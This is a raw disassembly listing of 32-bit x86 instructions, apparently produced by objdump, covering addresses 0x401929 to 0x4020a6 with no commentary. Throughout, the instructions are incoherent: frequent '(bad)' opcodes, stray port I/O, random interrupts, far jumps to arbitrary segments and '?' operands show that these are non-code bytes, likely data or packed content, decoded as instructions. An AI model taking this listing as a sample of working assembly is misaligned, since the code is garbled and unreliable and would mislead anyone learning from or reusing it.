  401929:	sti    
  40192a:	xor    eax,eax
  40192c:	jmp    0x4018f9
  40192e:	mov    edx,0xaf7762ac
  401933:	ja     0x4018e1
  401935:	mov    esi,0xc170a12
  40193a:	test   DWORD PTR es:[edx-0x7a],esi
  40193e:	and    edx,DWORD PTR [edi-0x143ae129]
  401944:	and    al,0xc6
  401946:	adc    eax,0xc388c58
  40194b:	cmp    eax,DWORD PTR [edx]
  40194d:	cmc    
  40194e:	mov    dl,0x41
  401950:	pushf  
  401951:	int    0x4c
  401953:	or     esi,DWORD PTR [ecx+eax*4+0x36]
  401957:	inc    ecx
  401958:	fisubr DWORD PTR [esi+0x2ff3544d]
  40195e:	pop    eax
  40195f:	cmc    
  401960:	sub    al,bh
  401962:	(bad)  
  401963:	in     al,dx
  401964:	mov    edx,0x7d7089b7
  401969:	or     DWORD PTR [edi-0x70cab008],ebx
  40196f:	int    0xc1
  401971:	xor    BYTE PTR [edx],0xb4
  401974:	fldcw  WORD PTR [ebp-0x7e64fc72]
  40197a:	xchg   ecx,eax
  40197b:	ins    DWORD PTR es:[edi],dx
  40197c:	mov    esi,0xa606f1d0
  401981:	popa   
  401982:	(bad)  
  401983:	cmp    bl,BYTE PTR [edx+0x3]
  401986:	pop    esp
  401987:	sbb    al,0x53
  401989:	ins    DWORD PTR es:[edi],dx
  40198a:	push   cs
  40198b:	jno    0x4019e6
  40198d:	(bad)  
  40198e:	jecxz  0x401939
  401990:	iret   
  401991:	imul   esp,DWORD PTR [edx],0xffffff89
  401994:	sar    BYTE PTR [ebp+0x5967a5bf],0xb8
  40199b:	enter  0x775a,0xbf
  40199f:	push   ebp
  4019a0:	cmp    bh,BYTE PTR [edx]
  4019a2:	or     al,0x99
  4019a4:	(bad)  
  4019a5:	outs   dx,BYTE PTR ds:[esi]
  4019a6:	clc    
  4019a7:	or     eax,0x837ecbd8
  4019ac:	xchg   BYTE PTR [ecx],ch
  4019ae:	out    dx,al
  4019af:	push   cs
  4019b0:	call   0x8079a369
  4019b5:	call   0x2760:0xe76d673b
  4019bc:	push   es
  4019bd:	mov    ch,0xda
  4019bf:	leave  
  4019c0:	sbb    edx,esi
  4019c2:	scas   al,BYTE PTR es:[edi]
  4019c3:	sbb    ch,BYTE PTR [eax+0x52]
  4019c6:	adc    al,0x1e
  4019c8:	imul   ecx,ebx,0x56a13581
  4019ce:	scas   eax,DWORD PTR es:[edi]
  4019cf:	test   al,0xed
  4019d1:	jecxz  0x401a10
  4019d3:	cdq    
  4019d4:	xchg   ecx,eax
  4019d5:	adc    edi,eax
  4019d7:	mov    bh,0x79
  4019d9:	pop    edx
  4019da:	add    al,BYTE PTR [ebx]
  4019dc:	mov    edi,edx
  4019de:	add    al,0xdb
  4019e0:	push   es
  4019e1:	xchg   edx,eax
  4019e2:	outs   dx,BYTE PTR ds:[esi]
  4019e3:	inc    BYTE PTR [edx]
  4019e5:	push   ebx
  4019e6:	jnp    0x401a62
  4019e8:	and    ebx,eax
  4019ea:	aas    
  4019eb:	jl     0x4019f8
  4019ed:	lods   al,BYTE PTR ds:[esi]
  4019ee:	lock movlps QWORD PTR [esi+ebx*1],xmm1
  4019f3:	jbe    0x4019c0
  4019f5:	jo     0x4019a5
  4019f7:	cmc    
  4019f8:	(bad)  
  4019f9:	aad    0xf1
  4019fb:	jmp    0x40197e
  4019fd:	dec    ecx
  4019fe:	and    dh,bl
  401a00:	mov    al,0x13
  401a02:	es and eax,0xac1e18ac
  401a08:	mov    edi,DWORD PTR [eax-0x7cfceaf0]
  401a0e:	les    edi,FWORD PTR [ebx-0x1cb9ae08]
  401a14:	jl     0x401a8a
  401a16:	xchg   esp,eax
  401a17:	mov    bh,0x15
  401a19:	clc    
  401a1a:	xchg   ebp,eax
  401a1b:	daa    
  401a1c:	and    DWORD PTR [esi+0x1c723266],edx
  401a22:	repz jns 0x4019ee
  401a25:	fdiv   DWORD PTR [edx-0x2e754e23]
  401a2b:	jmp    0x401a5a
  401a2d:	jl     0x4019e8
  401a2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a30:	fcmovbe st,st(3)
  401a32:	lock fstp TBYTE PTR [esi+0x4d]
  401a36:	cmp    edi,eax
  401a38:	pop    eax
  401a39:	retf   
  401a3a:	(bad)  
  401a3b:	pop    ebp
  401a3c:	(bad)  
  401a3d:	jle    0x401a73
  401a3f:	add    al,0x35
  401a41:	lock sbb ebp,DWORD PTR [ebx]
  401a44:	pop    edx
  401a45:	inc    eax
  401a46:	sub    BYTE PTR [edx+0x2d],ah
  401a49:	sbb    BYTE PTR [bp+di],0x49
  401a4d:	dec    eax
  401a4e:	mov    al,ds:0xd75c6f0e
  401a53:	out    dx,al
  401a54:	stos   DWORD PTR es:[edi],eax
  401a55:	xchg   ecx,eax
  401a56:	enter  0x2a6b,0xa5
  401a5a:	loope  0x4019f1
  401a5c:	push   ebp
  401a5d:	mov    ch,0x30
  401a5f:	mov    DWORD PTR [ecx-0x2bea5fab],ecx
  401a65:	sub    cl,BYTE PTR [eax+0x67]
  401a68:	iret   
  401a69:	loop   0x401a0a
  401a6b:	jae    0x401aa9
  401a6d:	mov    dh,0x64
  401a6f:	dec    ebx
  401a70:	xchg   ebx,eax
  401a71:	ror    edx,cl
  401a73:	inc    edx
  401a74:	sbb    esi,DWORD PTR [edx+0x51]
  401a77:	ret    
  401a78:	jl     0x401a9a
  401a7a:	pop    ss
  401a7b:	fwait
  401a7c:	ror    DWORD PTR [esi+edi*4+0x599ea65],0x57
  401a84:	fwait
  401a85:	lods   al,BYTE PTR ds:[esi]
  401a86:	daa    
  401a87:	bound  ebp,QWORD PTR [edi+0x58]
  401a8a:	nop
  401a8b:	(bad)  [eax+esi*8]
  401a8e:	sub    al,0x8
  401a90:	push   ecx
  401a91:	bound  eax,QWORD PTR [ebx]
  401a93:	inc    esp
  401a94:	mov    ah,0x78
  401a96:	arpl   WORD PTR [esp+ebx*2-0x2f],dx
  401a9a:	ror    DWORD PTR [edx-0x58527a54],cl
  401aa0:	jno    0x401a75
  401aa2:	out    0x60,eax
  401aa4:	mov    al,ds:0x566c3fdc
  401aa9:	(bad)  
  401aaa:	xchg   edi,eax
  401aab:	xchg   edx,eax
  401aac:	dec    edx
  401aad:	dec    ebx
  401aae:	mov    esi,0x2a671419
  401ab3:	aad    0x38
  401ab5:	adc    dh,BYTE PTR [eax+0x19]
  401ab8:	retf   
  401ab9:	fidivr WORD PTR [eax]
  401abb:	aam    0x5b
  401abd:	push   ecx
  401abe:	mov    esp,0xac6013ae
  401ac3:	out    0x50,al
  401ac5:	sbb    DWORD PTR [eax],esp
  401ac7:	add    al,0x49
  401ac9:	or     eax,0xe75159c9
  401ace:	sub    ecx,DWORD PTR [ecx]
  401ad0:	(bad)  
  401ad2:	int    0x32
  401ad4:	loopne 0x401a71
  401ad6:	fwait
  401ad7:	dec    edi
  401ad8:	lea    eax,[ebx]
  401ada:	lahf   
  401adb:	fsub   DWORD PTR ss:[ebx]
  401ade:	push   0xffffffa6
  401ae0:	enter  0xf414,0x9e
  401ae4:	out    0x59,al
  401ae6:	pop    edx
  401ae7:	imul   ebx,DWORD PTR [bx+0x3c],0xd453ef1b
  401aef:	sub    eax,0x8963e32
  401af4:	mov    eax,0x81f3c3f2
  401af9:	sbb    DWORD PTR [ebx-0x3d],ebp
  401afc:	dec    edi
  401afd:	and    al,0x31
  401aff:	ja     0x401ab3
  401b01:	shr    bh,1
  401b03:	aas    
  401b04:	xor    DWORD PTR [esi-0x3ad5ae61],esp
  401b0a:	fcom   QWORD PTR [ebp-0x7d]
  401b0d:	in     eax,0x56
  401b0f:	fmul   QWORD PTR [eax-0x7ece5f23]
  401b15:	sbb    bl,BYTE PTR [eax-0x66]
  401b18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b19:	fild   DWORD PTR [edx+0x2]
  401b1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b1d:	neg    DWORD PTR [edi]
  401b1f:	sbb    ecx,DWORD PTR [esi]
  401b21:	loop   0x401add
  401b23:	ins    DWORD PTR es:[edi],dx
  401b24:	cld    
  401b25:	lahf   
  401b26:	xor    eax,0x868ee59
  401b2b:	cdq    
  401b2c:	(bad)  
  401b2d:	dec    eax
  401b2e:	nop
  401b2f:	jl     0x401b3d
  401b31:	xchg   dh,al
  401b33:	adc    DWORD PTR [esi-0x62],ecx
  401b36:	mov    ebx,fs
  401b38:	cmp    ebp,DWORD PTR [edx+0x22]
  401b3b:	mov    bl,0x7e
  401b3d:	popa   
  401b3e:	dec    esp
  401b3f:	jne    0x401ae0
  401b41:	fs sti 
  401b43:	imul   esp,esi,0x24778207
  401b49:	paddsb mm6,QWORD PTR [ebp-0x65]
  401b4d:	lods   al,BYTE PTR ds:[esi]
  401b4e:	(bad)  
  401b4f:	shr    DWORD PTR [edi-0x44],cl
  401b52:	pop    esi
  401b53:	and    al,BYTE PTR [ecx+0x6]
  401b56:	xchg   ebx,eax
  401b57:	lods   al,BYTE PTR ds:[esi]
  401b58:	mov    cl,0x48
  401b5a:	dec    ebx
  401b5b:	add    DWORD PTR [edi],ebx
  401b5d:	inc    DWORD PTR [eax]
  401b5f:	xchg   edx,eax
  401b60:	xor    DWORD PTR [edi],0xffffff93
  401b63:	nop
  401b64:	mov    BYTE PTR [ebx],al
  401b66:	sbb    DWORD PTR ds:0x7bcf9d9d,eax
  401b6c:	xor    BYTE PTR ds:0x710043,cl
  401b72:	int3   
  401b73:	int    0xec
  401b75:	rcr    BYTE PTR [esi-0x21],cl
  401b78:	pop    esi
  401b79:	lahf   
  401b7a:	loope  0x401b9e
  401b7c:	fisttp WORD PTR [ebp-0x7d]
  401b7f:	sbb    eax,0xc274d1f8
  401b84:	jns    0x401bf8
  401b86:	pop    es
  401b87:	shl    BYTE PTR [edx],0x1a
  401b8a:	add    al,ch
  401b8c:	int    0x61
  401b8e:	jno    0x401bac
  401b90:	inc    edx
  401b91:	not    DWORD PTR [ecx-0x12]
  401b94:	pop    esp
  401b95:	jno    0x401be3
  401b97:	inc    esi
  401b98:	shl    BYTE PTR [edx+ecx*1],1
  401b9b:	inc    edx
  401b9c:	mov    ebx,0x6aebf099
  401ba1:	push   cs
  401ba2:	push   edx
  401ba3:	jo     0x401b5c
  401ba5:	int    0x81
  401ba7:	mov    esp,0xa3655283
  401bac:	ds dec edx
  401bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401baf:	pushf  
  401bb0:	pop    ds
  401bb1:	inc    eax
  401bb2:	jg     0x401bdf
  401bb4:	cld    
  401bb5:	mov    al,0x24
  401bb7:	inc    edi
  401bb8:	loop   0x401c26
  401bba:	call   0x2428:0xd4b83f3b
  401bc1:	ins    DWORD PTR es:[edi],dx
  401bc2:	cmc    
  401bc3:	xor    al,BYTE PTR [esi-0x6b890da1]
  401bc9:	in     al,0x5b
  401bcb:	enter  0xba63,0xdd
  401bcf:	mov    eax,0x152f46e6
  401bd4:	add    dl,BYTE PTR [ecx]
  401bd6:	pop    DWORD PTR [edi+ebx*4]
  401bd9:	inc    esp
  401bda:	mov    eax,ds:0xb240bd84
  401bdf:	mov    dl,0x57
  401be1:	dec    edi
  401be2:	sbb    DWORD PTR [esi-0xe],0xd09d577b
  401be9:	sub    al,0x78
  401beb:	lods   eax,DWORD PTR ds:[esi]
  401bec:	jmp    0x401c07
  401bee:	imul   edx,esp,0xe2944862
  401bf4:	(bad)  
  401bf5:	cwde   
  401bf6:	es ss jl 0x401ba0
  401bfa:	rcl    BYTE PTR [esi-0x7c],1
  401bfd:	mov    al,ds:0xd19aa764
  401c02:	mov    cl,0x3f
  401c04:	in     al,dx
  401c05:	xchg   DWORD PTR [edx-0x42],esp
  401c08:	retf   0x8984
  401c0b:	jns    0x401bc1
  401c0d:	fsub   QWORD PTR ds:0xdb95e90
  401c13:	inc    eax
  401c14:	dec    eax
  401c15:	in     al,dx
  401c16:	mov    ebp,DWORD PTR [eax-0x8ae19dd]
  401c1c:	and    al,0x56
  401c1e:	rcl    ah,cl
  401c20:	add    bh,BYTE PTR [edi-0x23]
  401c23:	lock stos BYTE PTR es:[edi],al
  401c25:	mov    ch,0x3d
  401c27:	and    DWORD PTR [edi-0x6c],0x4eb0469a
  401c2e:	pop    eax
  401c2f:	cdq    
  401c30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c31:	scas   al,BYTE PTR es:[edi]
  401c32:	test   BYTE PTR [eax-0xc0ca341],dh
  401c38:	mov    dh,0xf4
  401c3a:	int    0x3b
  401c3c:	repz or ah,0xa5
  401c40:	aas    
  401c41:	dec    edi
  401c42:	and    DWORD PTR [esi-0x8],ebp
  401c45:	lahf   
  401c46:	shl    ebp,1
  401c48:	adc    eax,0x744ead8f
  401c4d:	rcr    DWORD PTR [edi-0x18],cl
  401c50:	(bad)  
  401c51:	ficom  DWORD PTR [edi-0x11]
  401c54:	aad    0x1f
  401c56:	dec    eax
  401c57:	add    esi,DWORD PTR [ecx-0x4ecf40e8]
  401c5d:	pusha  
  401c5e:	lds    ebp,FWORD PTR [edx-0x4813ed2e]
  401c64:	and    al,0x15
  401c66:	int    0xd9
  401c68:	lods   al,BYTE PTR ds:[esi]
  401c69:	sti    
  401c6a:	iret   
  401c6b:	(bad)  
  401c6d:	ret    
  401c6e:	retf   
  401c6f:	loopne 0x401c20
  401c71:	mov    esi,0x15b877a6
  401c76:	sbb    BYTE PTR [edx+0x3574ba00],0x8a
  401c7d:	ins    BYTE PTR es:[edi],dx
  401c7e:	ret    
  401c7f:	push   esp
  401c80:	adc    al,0xf1
  401c82:	clc    
  401c83:	push   cs
  401c84:	cli    
  401c85:	pop    esp
  401c86:	mov    al,ds:0x3199227e
  401c8c:	push   ebp
  401c8d:	xchg   esi,eax
  401c8e:	sar    DWORD PTR [edx+0x76],1
  401c91:	fcom   QWORD PTR [edx]
  401c93:	and    bh,ch
  401c95:	mov    eax,ds:0x6e2a6729
  401c9a:	int    0x95
  401c9c:	ins    BYTE PTR es:[edi],dx
  401c9d:	sti    
  401c9e:	outs   dx,BYTE PTR ds:[esi]
  401c9f:	mov    eax,0x232291e6
  401ca4:	jne    0x401d10
  401ca6:	and    al,0x8b
  401ca8:	dec    ebp
  401ca9:	cld    
  401caa:	in     al,0x97
  401cac:	inc    eax
  401cad:	inc    esi
  401cae:	jb     0x401caa
  401cb0:	push   ebp
  401cb1:	xchg   esi,eax
  401cb2:	enter  0xa969,0xfb
  401cb6:	in     al,dx
  401cb7:	mov    BYTE PTR [ebp+0x6c],0x7d
  401cbb:	xor    dh,BYTE PTR [edx+0x18bfbaf8]
  401cc1:	ret    
  401cc2:	or     ebp,DWORD PTR [ebp-0x36]
  401cc5:	mov    cl,0x2b
  401cc7:	jae    0x401cfe
  401cc9:	div    BYTE PTR [edi]
  401ccb:	movhps QWORD PTR [edi-0x18],xmm1
  401ccf:	rol    BYTE PTR [edi],1
  401cd1:	mov    bl,ah
  401cd3:	pop    eax
  401cd4:	ret    
  401cd5:	arpl   WORD PTR [edx+0x32b1046e],dx
  401cdb:	loope  0x401cbc
  401cdd:	imul   ecx,esi,0xb569a43d
  401ce3:	loop   0x401d49
  401ce5:	cmp    edi,DWORD PTR [esi]
  401ce7:	popf   
  401ce8:	mov    bh,BYTE PTR [edi+0x77]
  401ceb:	test   DWORD PTR [ecx-0x4d785fef],esp
  401cf1:	hlt    
  401cf2:	cmp    al,0x46
  401cf4:	js     0x401d4c
  401cf6:	push   0x63
  401cf8:	retf   0x7d12
  401cfb:	jl     0x401d22
  401cfd:	jnp    0x401c85
  401cff:	jmp    DWORD PTR [ecx]
  401d01:	jecxz  0x401d12
  401d03:	stos   DWORD PTR es:[edi],eax
  401d04:	clc    
  401d05:	into   
  401d06:	mul    bl
  401d08:	out    dx,al
  401d09:	cmp    al,0xef
  401d0b:	loopne 0x401cf1
  401d0d:	and    eax,0x3e43618d
  401d12:	cmp    al,BYTE PTR ds:0x75aac21f
  401d18:	cs mov ebp,0x859632df
  401d1e:	sbb    BYTE PTR [ebx],bh
  401d20:	in     al,dx
  401d21:	dec    ebp
  401d22:	sbb    cl,bh
  401d24:	adc    eax,0x7a420403
  401d29:	inc    ebp
  401d2a:	push   cs
  401d2b:	fnstenv [edx+edi*8]
  401d2e:	dec    esp
  401d2f:	shl    DWORD PTR [ecx+ebp*8-0x2a9d0ca7],1
  401d36:	inc    esi
  401d37:	jae    0x401d8c
  401d39:	pop    ecx
  401d3a:	leave  
  401d3b:	inc    edx
  401d3c:	dec    ebx
  401d3d:	mov    ds:0x7bd27b7e,eax
  401d42:	adc    esi,DWORD PTR [ebx-0x5a1cc364]
  401d48:	shl    bl,1
  401d4a:	inc    ebp
  401d4b:	push   0x42f5ec3c
  401d50:	enter  0x34c5,0xa6
  401d54:	das    
  401d55:	sbb    esi,DWORD PTR [esi+0x4b51c85f]
  401d5b:	dec    esi
  401d5c:	ds jg  0x401d5b
  401d5f:	dec    edi
  401d60:	mov    dh,0x63
  401d62:	adc    al,0x92
  401d64:	(bad)  
  401d65:	retf   0xdb4
  401d68:	(bad)  
  401d69:	jle    0x401d28
  401d6b:	repnz mov DWORD PTR [bx+si-0x1f],ebp
  401d70:	xchg   ebx,eax
  401d71:	aaa    
  401d72:	dec    esi
  401d73:	sub    al,0xea
  401d75:	call   0xc06a232f
  401d7a:	sahf   
  401d7b:	mov    dl,0x46
  401d7d:	fsubrp st(5),st
  401d7f:	bound  edx,QWORD PTR [esi]
  401d81:	adc    bh,BYTE PTR [edi]
  401d83:	aaa    
  401d84:	mov    dh,0x87
  401d86:	add    edi,esp
  401d88:	xchg   ebx,ebp
  401d8a:	imul   edx,DWORD PTR [ecx-0x3f8ad751],0xf06b0582
  401d94:	sub    edx,DWORD PTR [esp+edi*8-0x7]
  401d98:	scas   eax,DWORD PTR es:[edi]
  401d99:	rcl    DWORD PTR [ebp+0x4c],1
  401d9c:	into   
  401d9d:	sbb    bh,BYTE PTR [ebx+0x7f]
  401da0:	or     ecx,DWORD PTR [esi]
  401da2:	add    DWORD PTR [edx+0x34900593],eax
  401da8:	pop    ebx
  401da9:	push   ecx
  401daa:	mov    al,0x7f
  401dac:	pusha  
  401dad:	xchg   esi,eax
  401dae:	adc    ecx,DWORD PTR [edi+0x57af3d4d]
  401db4:	sub    edx,DWORD PTR [ebx]
  401db6:	and    DWORD PTR [esi+0xf],0xffffffb8
  401dba:	jne    0x401d90
  401dbc:	xchg   ebx,eax
  401dbd:	shr    DWORD PTR [ecx+0x5a],cl
  401dc0:	lock retf 0xbbb
  401dc4:	pop    edx
  401dc5:	rol    dh,cl
  401dc7:	push   edi
  401dc8:	outs   dx,DWORD PTR ds:[esi]
  401dc9:	mov    ebx,ecx
  401dcb:	das    
  401dcc:	adc    eax,0x6e65b875
  401dd1:	jno    0x401ddf
  401dd3:	fiadd  DWORD PTR [ecx-0x4663d6de]
  401dd9:	cli    
  401dda:	sub    esi,DWORD PTR [edi-0x2a]
  401ddd:	pop    bp
  401ddf:	je     0x401d70
  401de1:	adc    dh,bl
  401de3:	adc    ah,BYTE PTR [ebx+0x590c201]
  401de9:	add    bh,bh
  401deb:	push   es
  401dec:	jg     0x401e5b
  401dee:	mov    al,0x54
  401df0:	test   al,0x20
  401df2:	loopne 0x401dd2
  401df4:	xchg   bh,bh
  401df6:	cmp    eax,0x32e94e95
  401dfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dfc:	mov    ss,WORD PTR [ebp+0x3418b48d]
  401e02:	or     edx,DWORD PTR [esi-0x6cd57437]
  401e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e09:	aas    
  401e0a:	test   BYTE PTR [ebx-0x53],0xe7
  401e0e:	out    0xa2,al
  401e10:	test   eax,0xb503805d
  401e15:	jg     0x401e52
  401e17:	sbb    cl,al
  401e19:	lods   al,BYTE PTR ds:[esi]
  401e1a:	adc    edx,0x19c50335
  401e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e21:	inc    esp
  401e22:	adc    DWORD PTR [ebx+0x70],0x3189b6c8
  401e29:	popf   
  401e2a:	or     cl,BYTE PTR [ebx]
  401e2c:	jecxz  0x401dc8
  401e2e:	jecxz  0x401dc4
  401e30:	inc    esi
  401e31:	jns    0x401dec
  401e33:	sbb    eax,0x5ba94fa3
  401e38:	add    eax,0xc6b69c7c
  401e3d:	icebp  
  401e3e:	sbb    DWORD PTR [ecx+0x1c],ecx
  401e41:	lahf   
  401e42:	jg     0x401dea
  401e44:	inc    edi
  401e45:	leave  
  401e46:	nop
  401e47:	in     al,0xbb
  401e49:	ss clc 
  401e4b:	js     0x401e34
  401e4d:	mov    cl,0xc5
  401e4f:	mov    cl,BYTE PTR [eax+0x489d3fc3]
  401e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e56:	repnz xchg edx,eax
  401e58:	jb     0x401e10
  401e5a:	push   0x5c760282
  401e5f:	xchg   esp,eax
  401e60:	jg     0x401ecd
  401e62:	mov    al,ds:0x1168e4e
  401e67:	mov    WORD PTR [ebx],?
  401e69:	mov    bl,0xb0
  401e6b:	adc    DWORD PTR ds:0x9ac5f2f3,ecx
  401e71:	sbb    al,0xa6
  401e73:	cmp    ebp,DWORD PTR [edx+0x4f5370c0]
  401e79:	cmp    al,0x69
  401e7b:	jg     0x401e37
  401e7d:	jg     0x401e92
  401e7f:	add    eax,0x8133c5fe
  401e84:	mov    cl,bl
  401e86:	inc    ebx
  401e87:	mov    al,0xd4
  401e89:	mov    ?,WORD PTR [ecx]
  401e8b:	int    0xb1
  401e8d:	xchg   ebx,eax
  401e8e:	cli    
  401e8f:	(bad)  
  401e90:	mov    edi,0xcc155b47
  401e95:	push   eax
  401e96:	mov    bl,0xcd
  401e98:	xchg   edx,eax
  401e99:	pop    eax
  401e9a:	xchg   DWORD PTR [edi],ebx
  401e9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e9d:	into   
  401e9e:	pop    edx
  401e9f:	out    0x63,al
  401ea1:	dec    ebx
  401ea2:	jl     0x401e9d
  401ea4:	jnp    0x401e99
  401ea6:	test   DWORD PTR [eax-0x16],ebx
  401ea9:	scas   eax,DWORD PTR es:[edi]
  401eaa:	adc    DWORD PTR ds:0x75291f2,esi
  401eb0:	add    eax,0x34157a84
  401eb5:	cmc    
  401eb6:	xchg   DWORD PTR [edi+0x36],edi
  401eb9:	push   cs
  401eba:	xor    BYTE PTR [esi+0x6],0x8
  401ebe:	pop    es
  401ebf:	mov    ebx,0xf5045807
  401ec4:	add    ah,BYTE PTR [eax-0x3c]
  401ec7:	xchg   edi,eax
  401ec8:	add    DWORD PTR ds:0x716674d1,ebp
  401ece:	mov    ebx,0xc6469cde
  401ed3:	outs   dx,BYTE PTR ds:[esi]
  401ed4:	addr16 mov esp,0x3197bc05
  401eda:	ret    
  401edb:	test   DWORD PTR [ebx+0xce87177],ebp
  401ee1:	mov    edx,DWORD PTR [ebx]
  401ee3:	mov    ds:0xc305526,al
  401ee8:	loop   0x401f2c
  401eea:	jmp    0x401f0d
  401eec:	ret    
  401eed:	mov    BYTE PTR [edi],al
  401eef:	inc    edx
  401ef0:	stc    
  401ef1:	test   DWORD PTR [eax],0xb76b6822
  401ef7:	repz leave 
  401ef9:	sub    DWORD PTR [edi],ebp
  401efb:	aad    0x2c
  401efd:	inc    ecx
  401efe:	fistp  DWORD PTR [ebp-0x30]
  401f01:	es add eax,0xf3004a29
  401f07:	push   ds
  401f08:	pop    ebp
  401f09:	test   BYTE PTR [ebx+0x1],ah
  401f0c:	mov    ch,0xb1
  401f0e:	arpl   di,dx
  401f10:	imul   eax,DWORD PTR [ebp-0x7983a313],0xffffffc8
  401f17:	aaa    
  401f18:	pop    esi
  401f19:	int    0x97
  401f1b:	scas   eax,DWORD PTR es:[edi]
  401f1c:	lock rcr DWORD PTR [ebx+edi*8],0xa6
  401f21:	scas   eax,DWORD PTR es:[edi]
  401f22:	sub    BYTE PTR [edi+0x12],dl
  401f25:	pop    ecx
  401f26:	test   BYTE PTR [ebx-0x3f],al
  401f29:	inc    edi
  401f2a:	or     ebx,DWORD PTR [eax+ebp*1]
  401f2d:	imul   esp,DWORD PTR [edx-0x74f5807],0x8373718
  401f37:	dec    eax
  401f38:	inc    ecx
  401f39:	ins    DWORD PTR es:[edi],dx
  401f3a:	inc    edi
  401f3b:	sti    
  401f3c:	xchg   esp,eax
  401f3d:	dec    edx
  401f3e:	inc    esp
  401f3f:	imul   ecx,DWORD PTR [eax-0xc1ec9ec],0x78
  401f46:	daa    
  401f47:	int    0x3
  401f49:	cmp    al,0xd9
  401f4b:	jno    0x401f90
  401f4d:	in     eax,dx
  401f4e:	or     esi,ebp
  401f50:	fisttp DWORD PTR [edi-0x4300ba6e]
  401f56:	pop    eax
  401f57:	ret    
  401f58:	out    dx,eax
  401f59:	ss xor eax,0xd4466b5
  401f5f:	adc    ah,BYTE PTR [eax+0x455d2693]
  401f65:	inc    ecx
  401f66:	pop    es
  401f67:	pop    ss
  401f68:	mov    bh,0x78
  401f6a:	nop
  401f6b:	mov    al,ds:0xc9d6e719
  401f70:	mov    bl,0x94
  401f72:	sti    
  401f73:	push   edx
  401f74:	test   DWORD PTR [ebx+0x7a],ecx
  401f77:	inc    esi
  401f78:	inc    ebx
  401f79:	fcomp  QWORD PTR ds:0x396b2052
  401f7f:	sbb    DWORD PTR [ecx],0x2a
  401f82:	mov    eax,ds:0xfdfdd929
  401f87:	and    ebx,DWORD PTR [ecx]
  401f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f8a:	mov    al,0x51
  401f8c:	lahf   
  401f8d:	mov    ah,0xb1
  401f8f:	mov    cl,0xc2
  401f91:	mov    ebx,0xf10fd74c
  401f96:	mov    eax,ds:0x23313d6a
  401f9b:	sti    
  401f9c:	push   edi
  401f9d:	aad    0x90
  401f9f:	push   edx
  401fa0:	stos   BYTE PTR es:[edi],al
  401fa1:	xor    BYTE PTR [edi+0x4e],0xa5
  401fa5:	in     al,0xf
  401fa7:	mov    ch,0x75
  401fa9:	adc    eax,ebx
  401fab:	aaa    
  401fac:	jae    0x401f56
  401fae:	stos   BYTE PTR es:[edi],al
  401faf:	push   ecx
  401fb0:	fist   DWORD PTR [ebp+0x403d4844]
  401fb6:	test   DWORD PTR [eax+eax*8],edi
  401fb9:	loop   0x401fef
  401fbb:	add    al,0x36
  401fbd:	mov    es,WORD PTR [esi+0x4e]
  401fc0:	ret    0x6740
  401fc3:	mov    al,0x8
  401fc5:	test   DWORD PTR [esp+eax*2+0x63],esp
  401fc9:	mov    ah,0x2f
  401fcb:	mov    ds:0x67d425a,al
  401fd0:	xchg   DWORD PTR [esi+edx*1-0x3a],edx
  401fd4:	outs   dx,DWORD PTR ds:[esi]
  401fd5:	stos   BYTE PTR es:[edi],al
  401fd6:	pop    edx
  401fd7:	in     eax,dx
  401fd8:	pop    ecx
  401fd9:	test   DWORD PTR [esi+eiz*1+0x2651ade0],eax
  401fe0:	jg     0x402019
  401fe2:	popa   
  401fe3:	ret    0xf658
  401fe6:	jg     0x40203c
  401fe8:	push   0x7f607ef
  401fed:	pushf  
  401fee:	lock xchg BYTE PTR [edi+0x1e212c9e],al
  401ff5:	out    0x22,eax
  401ff7:	mov    ebp,0x11baf672
  401ffc:	outs   dx,DWORD PTR ds:[esi]
  401ffd:	mov    dh,0x3
  401fff:	aad    0xe9
  402001:	mov    edx,0xbe6ba4dc
  402006:	(bad)  
  402008:	repnz mov cl,bl
  40200b:	jmp    0x296c:0x9d01def2
  402012:	push   cs
  402013:	inc    esp
  402014:	and    BYTE PTR [ecx],al
  402016:	fcomp  QWORD PTR [esi-0x59]
  402019:	mov    esi,0x31b5e91c
  40201e:	and    al,ah
  402020:	loop   0x402009
  402022:	pop    es
  402023:	cmp    BYTE PTR [ebx+0x5741baa6],0x82
  40202a:	into   
  40202b:	jae    0x401fcc
  40202d:	add    dl,BYTE PTR [ecx+edi*4]
  402030:	jmp    0xe57f2734
  402035:	out    0xf5,al
  402037:	iret   
  402038:	adc    DWORD PTR [edi],ecx
  40203a:	fdivr  DWORD PTR [edi]
  40203c:	mov    BYTE PTR [ebx+0x25],ch
  40203f:	enter  0xb51,0x35
  402043:	js     0x4020bc
  402045:	xchg   esi,eax
  402046:	rcl    dh,cl
  402048:	mov    eax,ds:0xec2afff0
  40204d:	pusha  
  40204e:	sub    DWORD PTR [esi],0x1eaca343
  402054:	adc    DWORD PTR [ecx+0x1bd937d5],edx
  40205a:	or     DWORD PTR [ebp+0x1d],edx
  40205d:	in     al,dx
  40205e:	pushf  
  40205f:	leave  
  402060:	xchg   ebx,eax
  402061:	shr    DWORD PTR ds:0xc5b68397,cl
  402067:	pop    edx
  402068:	xor    BYTE PTR [ecx+0x15629b30],bh
  40206e:	in     eax,0xbe
  402070:	int    0x63
  402072:	les    ebx,FWORD PTR [ebx-0x43]
  402075:	jge    0x40202c
  402077:	repz mov dh,0x9f
  40207a:	int3   
  40207b:	sar    BYTE PTR [ecx+ecx*1-0x146e32d1],1
  402082:	pop    ss
  402083:	adc    dh,BYTE PTR [edi+0x34c7964f]
  402089:	mov    bl,0x9e
  40208b:	and    BYTE PTR [esi+0x75],dl
  40208e:	add    DWORD PTR [esi+0x516c6c95],esi
  402094:	mov    edi,DWORD PTR [edx]
  402096:	inc    ebp
  402097:	ins    BYTE PTR es:[edi],dx
  402098:	pop    es
  402099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40209a:	adc    bh,BYTE PTR [eax+0x5b]
  40209d:	call   0x64e2:0x502b0527
  4020a4:	nop
  4020a5:	iret   
  4020a6:	mov    esi,esi
